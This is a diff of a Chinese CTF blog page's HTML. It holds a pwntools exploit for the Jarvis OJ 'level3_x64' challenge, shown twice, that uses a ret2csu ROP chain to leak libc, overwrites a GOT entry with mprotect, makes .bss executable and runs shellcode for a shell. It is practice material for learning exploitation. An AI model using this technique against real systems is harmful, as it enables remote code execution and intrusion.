class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pop7ret = <span class="number">0x00000000004006aa</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400690</span></span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    io = process(<span class="string">"./level3_x64"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.19.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]   <span class="comment"># leak基址</span></span><br><span class="line">    mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">    log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">    io.send(shellcode)</span><br><span class="line"></span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">    io.send(p64(mprotect))</span><br><span class="line"></span><br><span class="line">    _x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    io.interactive()</span><br></pre></div></td></tr></table></figure>
-<p><img src="https://s1.ax1x.com/2020/04/30/JqLnIO.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="最终exp与结果"><a href="#最终exp与结果" class="headerlink" title="最终exp与结果"></a>最终exp与结果</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"./level3_x64"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</span><br><span class="line">pop7ret = <span class="number">0x00000000004006aa</span></span><br><span class="line">mov3call = <span class="number">0x0000000000400690</span></span><br><span class="line">vul_func_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">main_got = elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_x64rop</span><span class="params">(func_got,arg1,arg2,arg3,returnData=False)</span>:</span></span><br><span class="line">    payload = flat(</span><br><span class="line">    cyclic(<span class="number">0x88</span>),   <span class="comment"># 溢出</span></span><br><span class="line">    p64(pop7ret),   </span><br><span class="line">    p64(<span class="number">0</span>),         </span><br><span class="line">    p64(<span class="number">1</span>),         <span class="comment"># rbp于rbx初始化</span></span><br><span class="line">    p64(func_got),  <span class="comment"># 我们要到达的目标函数的GOT位置</span></span><br><span class="line">    p64(arg3),</span><br><span class="line">    p64(arg2),</span><br><span class="line">    p64(arg1),      <span class="comment"># 参数准备</span></span><br><span class="line">    p64(mov3call),  <span class="comment"># 参数准备2</span></span><br><span class="line">    cyclic(<span class="number">0x38</span>),   <span class="comment"># 7*8补位</span></span><br><span class="line">    p64(vul_func_addr)  <span class="comment"># 返回地址</span></span><br><span class="line">    )</span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    <span class="keyword">if</span> returnData == <span class="literal">True</span>:</span><br><span class="line">        Data = u64(io.recv(<span class="number">8</span>))   <span class="comment"># 需要leak地址时设为true</span></span><br><span class="line">        <span class="keyword">return</span> Data</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'0'</span>:</span><br><span class="line">    io = process(<span class="string">"./level3_x64"</span>,env = &#123;<span class="string">"LD_PRELOAD"</span>: <span class="string">"./libc-2.19.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9884</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    libc_base = _x64rop(write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,<span class="literal">True</span>)-libc.sym[<span class="string">'write'</span>]   <span class="comment"># leak基址</span></span><br><span class="line">    mprotect = libc.sym[<span class="string">'mprotect'</span>]+libc_base</span><br><span class="line">    log.success(<span class="string">"mprotect :%s"</span>%hex(mprotect))</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,bss_addr,len(shellcode)) <span class="comment"># 将shellcode用read读入bss段</span></span><br><span class="line">    io.send(shellcode)</span><br><span class="line"></span><br><span class="line">    _x64rop(read_got,<span class="number">0</span>,main_got,<span class="number">8</span>)              <span class="comment"># 用read在got表中main的地方覆盖为mprotect的地址，成功后可以通过got表调用mprotect</span></span><br><span class="line">    io.send(p64(mprotect))</span><br><span class="line"></span><br><span class="line">    _x64rop(main_got,<span class="number">0x00600000</span>,<span class="number">0x1000</span>,<span class="number">0x7</span>)     <span class="comment"># 修改bss段权限为可执行</span></span><br><span class="line"></span><br><span class="line">    payload = flat(cyclic(<span class="number">0x88</span>),p64(bss_addr))       <span class="comment"># 直接跳到bss执行shellcode</span></span><br><span class="line">    io.sendafter(<span class="string">"Input:\n"</span>,payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://s1.ax1x.com/2020/04/30/JqLnIO.png" alt=""></p>
 
-            </article>
-            <hr>
-            <div>
-              <div class="post-metas mb-3">
-                
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
-                    
-                  </div>
-                
-                
-              </div>
-              
-                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
-              
-              
-                <div class="post-prevnext row">
-                  <div class="post-prev col-6">
-                    
-                    
-                      <a href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">从一道菜单题锻炼pwn中的堆技能</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
-                  </div>
-                  <div class="post-next col-6">
-                    
-                    
-                      <a href="/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/">
-                        <span class="hidden-mobile">一道经典的ret2lib</span>
-                        <span class="visible-mobile">Next</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </div>
-                </div>
-              
-            </div>
+      
+    </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+        <div class="post-widgets">
+        
+          <div class="wp_rating">
+            <div id="wpac-rating"></div>
+          </div>
+        
+
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/25/%E4%B8%80%E9%81%93%E7%BB%8F%E5%85%B8%E7%9A%84ret2lib/" rel="next" title="一道经典的ret2lib">
+                <i class="fa fa-chevron-left"></i> 一道经典的ret2lib
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/05/09/%E4%BB%8E%E4%B8%80%E9%81%93%E8%8F%9C%E5%8D%95%E9%A2%98%E9%94%BB%E7%82%BCpwn%E4%B8%AD%E7%9A%84%E5%A0%86%E6%8A%80%E8%83%BD/" rel="prev" title="从一道菜单题锻炼pwn中的堆技能">
+                从一道菜单题锻炼pwn中的堆技能 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
-      </div>
-    </div>
-    
-      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
-        <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
-  <div id="tocbot"></div>
-</div>
-
-      </div>
-    
-  </div>
-</div>
-
-<!-- Custom -->
-
-
-    
-  </main>
-
-  
-    <a id="scroll-top-button" href="#" role="button">
-      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  
-
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <div>
-      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
-      <i class="iconfont icon-love"></i>
-      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
-        <span>Fluid</span></a>
-    </div>
-    
-
-    
-
-    
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
-<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
-<script  src="/js/debouncer.js" ></script>
-<script  src="/js/main.js" ></script>
-
-<!-- Plugins -->
-
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
-
-
-
-  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
-  <script  src="/js/clipboard-use.js" ></script>
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-
-  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      var boardCtn = $('#board-ctn');
-      var boardTop = boardCtn.offset().top;
-
-      tocbot.init({
-        tocSelector: '#tocbot',
-        contentSelector: 'article.markdown-body',
-        headingSelector: 'h1,h2,h3,h4,h5,h6',
-        linkClass: 'tocbot-link',
-        activeLinkClass: 'tocbot-active-link',
-        listClass: 'tocbot-list',
-        isCollapsedClass: 'tocbot-is-collapsed',
-        collapsibleClass: 'tocbot-is-collapsible',
-        collapseDepth: 0,
-        scrollSmooth: true,
-        headingsOffset: -boardTop
-      });
-      if ($('.toc-list-item').length > 0) {
-        $('#toc').css('visibility', 'visible');
-      }
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "从一道经典的x64pwn学习mprotect与GOT表覆写&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "hover",
       
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://avatars2.githubusercontent.com/u/48941180?s=460&u=c99ae53e7dd15c30c6283cc36edb2f8825ce8aec&v=4"
+               alt="Paxos" />
+          <p class="site-author-name" itemprop="name">Paxos</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">10</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">tags</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/OrangeGzY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:guoziyi114@gmail.com" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://stevelee477.github.io/" title="Stevelee477(全栈大佬)" target="_blank">Stevelee477(全栈大佬)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://minhal.me" title="Minhal(二进制爷爷👴)" target="_blank">Minhal(二进制爷爷👴)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://a2u13.com" title="A2u13(web爷爷👴)" target="_blank">A2u13(web爷爷👴)</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://zhiaowei.github.io/" title="uranus(web姐姐🧍)" target="_blank">uranus(web姐姐🧍)</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#写在前面（考察知识点）"><span class="nav-number">1.</span> <span class="nav-text">写在前面（考察知识点）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始pwn"><span class="nav-number">3.</span> <span class="nav-text">开始pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最终exp与结果"><span class="nav-number">4.</span> <span class="nav-text">最终exp与结果</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paxos</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">
+    NexT.Gemini
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i> 访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i> 总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+  wpac_init = window.wpac_init || [];
+  wpac_init.push({widget: 'Rating', id: ,
+    el: 'wpac-rating',
+    color: 'fc6423'
+  });
+  (function() {
+    if ('WIDGETPACK_LOADED' in window) return;
+    WIDGETPACK_LOADED = true;
+    var mc = document.createElement('script');
+    mc.type = 'text/javascript';
+    mc.async = true;
+    mc.src = '//embed.widgetpack.com/widget.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+  })();
   </script>
 
 
+  
 
-  <script  src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      searchFunc(path, 'local-search-input', 'local-search-result');
-      this.onclick = null
-    }
-  </script>
+  
 
-
-
-  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-  <script>
-    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
-      function () {
-        var element = document.createElement('a');
-        $(element).attr('data-fancybox', 'images');
-        $(element).attr('href', $(this).attr('src'));
-        $(this).wrap(element);
-      }
-    );
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  
 
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
